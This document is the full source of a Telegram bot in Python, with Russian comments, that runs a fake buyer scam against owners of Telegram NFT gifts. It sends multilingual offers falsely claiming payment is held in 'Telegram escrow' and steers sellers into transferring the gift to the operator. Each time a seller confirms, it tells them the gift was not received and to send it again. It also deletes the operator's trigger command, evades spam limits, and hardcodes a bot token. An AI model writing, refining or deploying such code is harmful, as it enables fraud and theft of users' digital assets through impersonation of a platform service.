import asyncio, re, random, string, logging
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, InlineKeyboardButton, LinkPreviewOptions, CallbackQuery,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

BOT_TOKEN = "8726930734:AAESV0MI_3abx8lJwN9sJLuUfYSkiX_oKwY"
ADMIN_ID  = 8926402887

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher()

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
# .buy <ссылка> <сумма> <s|g> [uk|en]
CMD_RE  = re.compile(
    r"^\.buy\s+(https?://t\.me/nft/\S+)\s+(\d+)\s+(s|g)(?:\s+(uk|en))?",
    re.IGNORECASE
)

offers: dict = {}   # order_id → dict

# ── Переводы ──────────────────────────────────────────────────
TEXTS = {
    "ru": {
        "offer":    "Пользователь предлагает вам",
        "for":      "за подарок",
        "valid":    "Оффер действителен ещё",
        "order":    "Ордер",
        "reserved": "Покупатель зарезервировал",
        "escrow":   ("через эскроу-систему Telegram. Средства хранятся на специальном "
                     "эскроу-счёте и будут автоматически зачислены на ваш баланс"),
        "after":    "сразу после передачи подарка.",
        "instr":    "Инструкция для завершения сделки:",
        "step1":    "Передайте подарок пользователю:",
        "step2":    "Нажмите «Передать NFT» и выберите",
        "step3":    "Подтвердите передачу подарка.",
        "credits":  "Telegram зафиксирует транзакцию и моментально зачислит",
        "balance":  "на ваш баланс. Резерв действует 24 часа.",
        "declined_text": "Оффер на",
        "declined_end":  "отклонён.",
        "warn":     ("Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок "
                     "и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение."),
        "transfer": "Передать NFT ↗",
        "confirm":  "Подтвердить передачу ✅",
        "accept":   "Принять",
        "decline":  "Отклонить",
        "not_received": ("Товар не получен.\n\n"
                         "Пожалуйста, попробуйте передать подарок ещё раз и подтвердите передачу."),
    },
    "uk": {
        "offer":    "Користувач пропонує вам",
        "for":      "за подарунок",
        "valid":    "Пропозиція дійсна ще",
        "order":    "Замовлення",
        "reserved": "Покупець зарезервував",
        "escrow":   ("через ескроу-систему Telegram. Кошти зберігаються на спеціальному "
                     "ескроу-рахунку та будуть автоматично зараховані на ваш баланс"),
        "after":    "одразу після передачі подарунку.",
        "instr":    "Інструкція для завершення угоди:",
        "step1":    "Передайте подарунок користувачу:",
        "step2":    "Натисніть «Передати NFT» та виберіть",
        "step3":    "Підтвердіть передачу подарунку.",
        "credits":  "Telegram зафіксує транзакцію та миттєво зарахує",
        "balance":  "на ваш баланс. Резерв діє 24 години.",
        "declined_text": "Пропозицію на",
        "declined_end":  "відхилено.",
        "warn":     ("Увага!\n\nДотримуйтесь інструкції, щоб не втратити подарунок "
                     "та отримати оплату.\n\nНатисніть «ОК», якщо ви прочитали це повідомлення."),
        "transfer": "Передати NFT ↗",
        "confirm":  "Підтвердити передачу ✅",
        "accept":   "Прийняти",
        "decline":  "Відхилити",
        "not_received": ("Товар не отримано.\n\n"
                         "Будь ласка, спробуйте передати подарунок ще раз та підтвердіть передачу."),
    },
    "en": {
        "offer":    "A user offers you",
        "for":      "for the gift",
        "valid":    "Offer valid for another",
        "order":    "Order",
        "reserved": "The buyer has reserved",
        "escrow":   ("via Telegram escrow. Funds are held in a dedicated escrow account "
                     "and will be automatically credited to your balance"),
        "after":    "immediately after the gift is transferred.",
        "instr":    "Instructions to complete the deal:",
        "step1":    "Transfer the gift to:",
        "step2":    "Tap «Transfer NFT» and select",
        "step3":    "Confirm the gift transfer.",
        "credits":  "Telegram will record the transaction and instantly credit",
        "balance":  "to your balance. The reserve is valid for 24 hours.",
        "declined_text": "Offer for",
        "declined_end":  "declined.",
        "warn":     ("Attention!\n\nFollow the instructions to avoid losing the gift "
                     "and to receive your payment.\n\nPress «OK» if you have read this message."),
        "transfer": "Transfer NFT ↗",
        "confirm":  "Confirm transfer ✅",
        "accept":   "Accept",
        "decline":  "Decline",
        "not_received": ("Item not received.\n\n"
                         "Please try transferring the gift again and confirm the transfer."),
    },
}

def T(lang, key):
    return TEXTS.get(lang, TEXTS["ru"])[key]

# ── Хелперы ───────────────────────────────────────────────────
def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug, num = m.group(1), m.group(2)
    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
    return name, num, slug

def oid():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))

def fmt_remaining(sent_at: datetime) -> str:
    deadline  = sent_at + timedelta(hours=6)
    remaining = deadline - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 ч. 0 мин."
    total_min = int(remaining.total_seconds() // 60)
    h, m = divmod(total_min, 60)
    return f"{h} ч. {m} мин."

def fmt_cur(amount, currency):
    if currency == "s":
        return f"<b>{amount:,} ⭐ Звёзд</b>"
    return f"<b>{amount:,} GRAM</b>"

def fmt_cur_plain(amount, currency):
    if currency == "s":
        return f"{amount:,} ⭐ Звёзд"
    return f"{amount:,} GRAM"

def cur_name(currency):
    return "Stars" if currency == "s" else "GRAM"

# ── Тексты сообщений ──────────────────────────────────────────
def build_offer_plain(amount, currency, gift_name, gift_num, sent_at, lang):
    return (
        f"{T(lang,'offer')} {fmt_cur(amount, currency)} "
        f"{T(lang,'for')} <b>{gift_name} #{gift_num}</b>.\n\n"
        f"{T(lang,'valid')} <b>{fmt_remaining(sent_at)}</b>"
    )

def build_offer_linked(amount, currency, gift_name, gift_num, url, sent_at, lang):
    return (
        f"{T(lang,'offer')} {fmt_cur(amount, currency)} "
        f"{T(lang,'for')} <b><a href=\"{url}\">{gift_name} #{gift_num}</a></b>.\n\n"
        f"{T(lang,'valid')} <b>{fmt_remaining(sent_at)}</b>"
    )

def build_deal(amount, currency, gift_name, gift_num, order_id, recipient, url, lang):
    cur = fmt_cur_plain(amount, currency)
    return (
        f"{T(lang,'order')} <b>#{order_id}</b>\n\n"
        f"{T(lang,'reserved')} <b>{cur}</b> {T(lang,'escrow')} "
        f"{cur_name(currency)} {T(lang,'after')}\n\n"
        f"<b>{T(lang,'instr')}</b>\n"
        f"1. {T(lang,'step1')} @{recipient}\n"
        f"2. {T(lang,'step2')} <a href=\"{url}\">{gift_name} #{gift_num}</a>\n"
        f"3. {T(lang,'step3')}\n\n"
        f"{T(lang,'credits')} <b>{cur}</b> {T(lang,'balance')}"
    )

# ── Клавиатуры ────────────────────────────────────────────────
def offer_kb(order_id, lang):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text=T(lang,"decline"), callback_data=f"decline:{order_id}"),
        InlineKeyboardButton(text=T(lang,"accept"),  callback_data=f"accept:{order_id}"),
    )
    return kb.as_markup()

def deal_kb(recipient, order_id, lang):
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(
        text=T(lang,"transfer"),
        url=f"tg://send_gift?to={recipient}",
    ))
    kb.row(InlineKeyboardButton(
        text=T(lang,"confirm"),
        callback_data=f"confirm:{order_id}",
    ))
    return kb.as_markup()

def admin_kb(order_id):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"adm_ok:{order_id}"),
        InlineKeyboardButton(text="❌ Не передан",  callback_data=f"adm_no:{order_id}"),
    )
    return kb.as_markup()

# ── Хендлер команды ───────────────────────────────────────────
@dp.business_message(F.text)
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return

    text = message.text or ""
    m = CMD_RE.match(text.strip())
    if not m:
        return

    link     = m.group(1)
    amount   = int(m.group(2))
    currency = m.group(3).lower()            # s | g
    lang     = (m.group(4) or "ru").lower()  # ru | uk | en

    recipient = message.chat.username or str(message.chat.id)

    gift = parse_gift(link)
    if not gift:
        return

    gift_name, gift_num, slug = gift
    nft_url  = f"https://t.me/nft/{slug}-{gift_num}"
    order_id = oid()
    sent_at  = datetime.now()
    chat_id  = message.chat.id

    # Шаг 1: без ссылки — не вызывает PEER_FLOOD
    try:
        sent = await bot.send_message(
            chat_id=chat_id,
            text=build_offer_plain(amount, currency, gift_name, gift_num, sent_at, lang),
            reply_markup=offer_kb(order_id, lang),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"send error: {e}")
        return

    offers[order_id] = {
        "amount": amount, "currency": currency, "lang": lang,
        "gift_name": gift_name, "gift_num": gift_num,
        "nft_url": nft_url, "recipient": recipient, "order_id": order_id,
        "sent_at": sent_at, "chat_id": chat_id, "msg_id": sent.message_id,
        "bcid": bcid, "status": "offer",
    }

    # Удаляем .buy команду
    try:
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[message.message_id],
        )
    except Exception as e:
        logging.error(f"del: {e}")

    # Шаг 2: редактируем со ссылкой и превью
    await asyncio.sleep(1.5)
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=sent.message_id,
            text=build_offer_linked(amount, currency, gift_name, gift_num, nft_url, sent_at, lang),
            reply_markup=offer_kb(order_id, lang),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True,
            ),
        )
    except TelegramBadRequest as e:
        logging.error(f"edit error: {e}")


# ── Принять ───────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = offers.get(order_id)
    if not d or d["status"] != "offer":
        await call.answer("Оффер недоступен или уже обработан.", show_alert=True)
        return

    d["status"] = "active"
    lang = d.get("lang", "ru")

    await call.answer(T(lang, "warn"), show_alert=True)

    try:
        await bot.edit_message_text(
            chat_id=d["chat_id"],
            message_id=d["msg_id"],
            text=build_deal(
                d["amount"], d["currency"], d["gift_name"], d["gift_num"],
                order_id, d["recipient"], d["nft_url"], lang
            ),
            reply_markup=deal_kb(d["recipient"], order_id, lang),
            business_connection_id=d["bcid"],
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=False,
            ),
        )
    except Exception as e:
        logging.error(f"accept edit: {e}")

    # Уведомление админу
    try:
        await bot.send_message(
            ADMIN_ID,
            f"✅ Оффер <b>#{order_id}</b> принят\n"
            f"Подарок: {d['gift_name']} #{d['gift_num']}\n"
            f"Сумма: {fmt_cur_plain(d['amount'], d['currency'])}\n"
            f"Получатель: @{d['recipient']}",
            reply_markup=admin_kb(order_id),
        )
    except Exception as e:
        logging.error(f"admin notify: {e}")


# ── Отклонить ─────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = offers.get(order_id)
    if not d:
        await call.answer("Оффер не найден.", show_alert=True)
        return

    d["status"] = "declined"
    lang = d.get("lang", "ru")
    await call.answer()

    try:
        await bot.edit_message_text(
            chat_id=d["chat_id"],
            message_id=d["msg_id"],
            text=(
                f"{T(lang,'declined_text')} "
                f"<a href=\"{d['nft_url']}\">{d['gift_name']} #{d['gift_num']}</a> "
                f"{T(lang,'declined_end')}"
            ),
            reply_markup=None,
            business_connection_id=d["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"decline edit: {e}")


# ── Подтвердить передачу ──────────────────────────────────────
@dp.callback_query(F.data.startswith("confirm:"))
async def cb_confirm(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = offers.get(order_id)
    if not d:
        await call.answer("Ордер не найден.", show_alert=True)
        return

    lang = d.get("lang", "ru")

    # Говорим продавцу что товар не получен, попробуй ещё раз
    await call.answer(T(lang, "not_received"), show_alert=True)

    # Уведомляем админа
    try:
        await bot.send_message(
            ADMIN_ID,
            f"⚠️ Продавец нажал «Подтвердить передачу» по ордеру <b>#{order_id}</b>\n"
            f"Подарок: {d['gift_name']} #{d['gift_num']}\n"
            f"Получатель: @{d['recipient']}\n"
            f"Проверьте передачу.",
            reply_markup=admin_kb(order_id),
        )
    except Exception as e:
        logging.error(f"confirm admin: {e}")


# ── Админ: подтвердить ────────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_ok:"))
async def cb_adm_ok(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = offers.get(order_id)
    if not d:
        await call.answer("Ордер не найден.")
        return
    d["status"] = "done"
    await call.answer("Сделка подтверждена.", show_alert=True)
    try:
        await bot.edit_message_text(
            chat_id=d["chat_id"],
            message_id=d["msg_id"],
            text=(
                f"✅ Сделка завершена!\n\n"
                f"Ордер <b>#{order_id}</b> выполнен. "
                f"{fmt_cur_plain(d['amount'], d['currency'])} зачислено на баланс."
            ),
            reply_markup=None,
            business_connection_id=d["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"adm_ok edit: {e}")
    await call.message.edit_reply_markup(reply_markup=None)


# ── Админ: не передан ─────────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_no:"))
async def cb_adm_no(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = offers.get(order_id)
    if not d:
        await call.answer("Ордер не найден.")
        return
    await call.answer("Помечено как не передано.", show_alert=True)
    try:
        await bot.edit_message_text(
            chat_id=d["chat_id"],
            message_id=d["msg_id"],
            text=(
                f"❌ Подарок не получен.\n\n"
                f"Ордер <b>#{order_id}</b>. Обратитесь в поддержку."
            ),
            reply_markup=None,
            business_connection_id=d["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"adm_no edit: {e}")
    await call.message.edit_reply_markup(reply_markup=None)


# ── /start ────────────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "Формат команды:\n"
        "<code>.buy https://t.me/nft/Name-123 7373 g</code> — GRAM\n"
        "<code>.buy https://t.me/nft/Name-123 500 s</code> — Stars\n"
        "<code>.buy https://t.me/nft/Name-123 500 s uk</code> — украинский\n"
        "<code>.buy https://t.me/nft/Name-123 500 s en</code> — английский"
    )


async def main():
    await dp.start_polling(
        bot,
        allowed_updates=[
            "business_connection",
            "business_message",
            "edited_business_message",
            "message",
            "callback_query",
        ],
    )

if __name__ == "__main__":
    asyncio.run(main())
